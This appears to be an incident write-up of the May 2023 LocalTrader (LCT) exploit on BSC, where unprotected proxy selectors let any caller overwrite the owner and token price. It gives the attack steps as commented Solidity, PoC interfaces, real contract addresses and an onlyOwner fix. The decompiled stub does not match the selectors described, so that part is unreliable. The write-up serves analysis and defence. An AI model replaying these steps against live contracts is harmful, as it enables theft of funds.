# LocalTrader (LCT) Exploit — Proxy Storage Slot Manipulation via Unprotected Selectors

## Metadata
| Field | Value |
|---|---|
| Date | 2023-05 |
| Project | LocalTrader (LCT) |
| Chain | BSC |
| Loss | Address unconfirmed |
| Attacker | Address unconfirmed |
| Attack TX | Address unconfirmed |
| Vulnerable Contract | UpgradeableProxy: 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41 |
| Block | Address unconfirmed |
| CWE | CWE-284 (Improper Access Control — unprotected proxy storage) |
| Vulnerability Type | Proxy Storage Slot Write via Unauthenticated Function Selectors |

## Summary
LocalTrader's upgradeable proxy contract exposed two function selectors (`0xb5863c10` and `0x925d400c`) that wrote directly to storage slots 0 and 3 without any authorization check. The attacker called these to change the owner to their address and set the LCT token price to 1, then bought LCT at the manipulated minimum price and swapped for WBNB profit.

## Vulnerability Details
- **CWE-284**: The proxy delegated calls to an implementation that contained storage-writing functions with no `onlyOwner` modifier. Function selector `0xb5863c10` overwrote the owner address (slot 0) and `0x925d400c` set the token price (slot 3) to any caller-supplied value — including `1`.

### On-chain Original Code

Source: Bytecode Decompiled

```solidity
// File: LocalTrader_decompiled.sol
contract LocalTrader {  // ❌

    // ❌ Proxy storage slot collision risk
    // Selector: 0x3659cfe6
    function upgradeTo(address account) external {}  // ❌

    // ❌ Proxy storage slot collision risk
    // Selector: 0x4f1ef286
    function upgradeToAndCall(address account, bytes data) external {}  // ❌

    // ❌ Proxy storage slot collision risk
    // Selector: 0x5c60da1b
    function implementation() external view returns (address) {}  // ❌

    // Selector: 0x8f283970
    function changeAdmin(address account) external {}  // ❌

    // Selector: 0xf851a440
    function admin() external {}

}

// ...

    function upgradeTo(address account) external {}  // ❌

// ...

    function upgradeToAndCall(address account, bytes data) external {}  // ❌

// ...

    function implementation() external view returns (address) {}  // ❌

// ...

    function changeAdmin(address account) external {}  // ❌
```

## Attack Flow (from testExploit())
```solidity
// 1. proxy.call(abi.encodeWithSelector(
//       0xb5863c10,
//       address(attacker)
//    ))  // set owner to attacker (slot 0 write)
// 2. proxy.call(abi.encodeWithSelector(
//       0x925d400c,
//       uint256(1)
//    ))  // set token price to 1 (slot 3 write)
// 3. LCTExchange.buyTokens{value: BNB}()
//    → buys LCT at price=1, receives huge amount of LCT
// 4. Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
//       LCT, 0, [LCT→WBNB], address(this), deadline
//    )  // swap LCT → WBNB for profit
```

## Interfaces from PoC
```solidity
interface ILCTExchange {
    function buyTokens() external payable;
}

interface IPancakeRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}
```

## Key Addresses
| Label | Address |
|---|---|
| UpgradeableProxy (Vulnerable) | 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41 |
| LCTExchange | 0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06 |
| LCT Token | 0x5C65BAdf7F97345B7B92776b22255c973234EfE7 |
| PancakeRouter | 0x10ED43C718714eb63d5aA57B78B54704E256024E |
| WBNB | 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c |

## Root Cause
The proxy implementation contract contained privileged storage-writing functions without access control modifiers. Any address could invoke these selectors to overwrite critical state including the contract owner and token price.

## Fix
```solidity
// Add onlyOwner to all state-modifying admin functions:
address private _owner;

modifier onlyOwner() {
    require(msg.sender == _owner, "Not owner");
    _;
}

function setOwner(address newOwner) external onlyOwner {
    _owner = newOwner;
}

function setTokenPrice(uint256 price) external onlyOwner {
    require(price >= MIN_PRICE, "Price too low");
    tokenPrice = price;
}
```

## References
- BSC UpgradeableProxy: 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41
- Selectors 0xb5863c10 (setOwner) and 0x925d400c (setPrice) had no auth